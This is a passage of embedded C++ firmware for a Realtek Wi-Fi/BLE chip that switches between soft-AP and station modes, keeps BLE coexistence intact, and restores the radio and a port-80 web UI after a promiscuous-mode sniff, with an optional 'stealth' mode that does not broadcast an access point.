      feedWatchdog();
      delay(40);
      didColdWifiReset = true;
    }

    int apRes = WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
    wlanLwipInitialized = true;
    feedWatchdog();

    int wextMode = -1;
    bool apUp = (apRes == WL_CONNECTED &&
                 wifi_is_up(RTW_AP_INTERFACE) &&
                 wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                 wextMode == RTW_MODE_MASTER);
    if (!apUp) {
      wlanRuntimeMode = wifi_is_up(RTW_AP_INTERFACE) ? WLAN_MODE_AP : WLAN_MODE_UNINIT;
      Serial.println("[ERROR] startSoftAP: WiFi.apbegin() failed or AP interface not up");
      continue;
    }

    wlanRuntimeMode = WLAN_MODE_AP;
    WiFi.disablePowerSave();
    softApActive = true;
    setCurrentChannelSafe(WIFI_CHANNEL);
    continuous5GHzSinceMs = 0;
    restoreBleCoex(didColdWifiReset);

    if (startWebServer(3)) {
      return true;
    }
    Serial.println("[ERROR] startSoftAP: WebServer bind(80) failed after retries");
    stopWebServer();
    softApActive = false;
  }

  int wextMode = -1;
  if (wifi_is_up(RTW_AP_INTERFACE) &&
      wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
      wextMode == RTW_MODE_MASTER) {
    wlanRuntimeMode = WLAN_MODE_AP;
    WiFi.disablePowerSave();
    softApActive = true;
    setCurrentChannelSafe(WIFI_CHANNEL);
    continuous5GHzSinceMs = 0;
    restoreBleCoex(true);
    return webServerRunning();
  }

  wlanRuntimeMode = WLAN_MODE_UNINIT;
  softApActive = false;
  WiFi.disablePowerSave();
  restoreBleCoex(false);
  return false;
}

//==========================================================
// Radio Management — Enter STA Mode
//==========================================================
bool enterStaMode(const char *context) {
  stopWebServer();
  softApActive = false;
  int wextMode = -1;
  bool alreadySta = (wlanRuntimeMode == WLAN_MODE_STA &&
                   wifi_is_up(RTW_STA_INTERFACE) &&
                   !wifi_is_up(RTW_AP_INTERFACE) &&
                   wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                   wextMode == RTW_MODE_INFRA);
  bool didColdWifiReset = false;
  bool didHotSwitch = false;
  if (!alreadySta) {
    // 优先通过 wifi_set_mode(RTW_MODE_STA) 热切模式：绝不触发 wifi_off()/wifi_on()
    // 中的 rtl8721d_hal_deinit/hal_init + ex_hal8721d_wifi_only_hw_config，保持 BLE RF 与 PTA 连续不断链。
    if (wifi_is_up(RTW_AP_INTERFACE) || wifi_is_up(RTW_STA_INTERFACE)) {
      dhcps_deinit();
      feedWatchdog();
      int swRet = wifi_set_mode(RTW_MODE_STA);
      feedWatchdog();
      int chkMode = -1;
      if (swRet == RTW_SUCCESS &&
          wifi_is_up(RTW_STA_INTERFACE) &&
          !wifi_is_up(RTW_AP_INTERFACE) &&
          wext_get_mode(WLAN0_NAME, &chkMode) == RTW_SUCCESS &&
          chkMode == RTW_MODE_INFRA) {
        didHotSwitch = true;
        wlanRuntimeMode = WLAN_MODE_STA;
      } else {
        Serial.print("[WARN] wifi_set_mode(RTW_MODE_STA) failed ret=");
        Serial.println(swRet);
      }
    }
    if (!didHotSwitch) {
      wifi_off();
      feedWatchdog();
      delay(40);
      if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
        wlanRuntimeMode = WLAN_MODE_UNINIT;
        Serial.print("[ERROR] wifi_on(RTW_MODE_STA) failed");
        if (context && context[0] != '\0') {
          Serial.print(" (");
          Serial.print(context);
          Serial.print(")");
        }
        Serial.println(".");
        restoreBleCoex(false);
        return false;
      }
      delay(20);
      feedWatchdog();
      wlanRuntimeMode = WLAN_MODE_STA;
      didColdWifiReset = true;
    }
  }
  if (!alreadySta) {
    WiFi.disablePowerSave();
    restoreBleCoex(didColdWifiReset);
  } else {
    enforceBleCoexPta(true);
  }
  if (!alreadySta || getCurrentChannelSafe() != WIFI_CHANNEL) {
    if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
      setCurrentChannelSafe(WIFI_CHANNEL);
      continuous5GHzSinceMs = 0;
    } else {
      Serial.print("[WARN] wifi_set_channel(");
      Serial.print(WIFI_CHANNEL);
      Serial.println(") failed after STA switch.");
    }
  }
  return true;
}

//==========================================================
// Radio Management — Restore After Sniff
//==========================================================
void restoreRadioAfterSniff() {
  if (apEnabled) {
    // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
    // bring the AP and web server back up so the phone can reconnect.
    if (startSoftAP()) {
      Serial.print("[INFO] Soft AP restarted: ");
      Serial.println(ap_ssid);
    } else if (softApActive) {
      Serial.println("[WARN] Soft AP radio active, but WebUI port 80 failed to bind (will self-heal).");
    } else {
      Serial.println("[ERROR] Failed to restart Soft AP after sniff!");
    }
  } else {
    // BLE-only stealth mode (ap off): restore STA mode so scan/TX work without broadcasting AP
    if (enterStaMode("restoreRadioAfterSniff")) {
      Serial.println("[INFO] Restored STA mode (BLE-only stealth).");
    }
  }
}

//==========================================================
// Radio Management — Schedule AP Restart
//==========================================================
void scheduleApRestart() {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (apEnabled && !sniffingNow) {
    pendingApRestart = true;
    pendingApRestartAt = millis();
  }
}
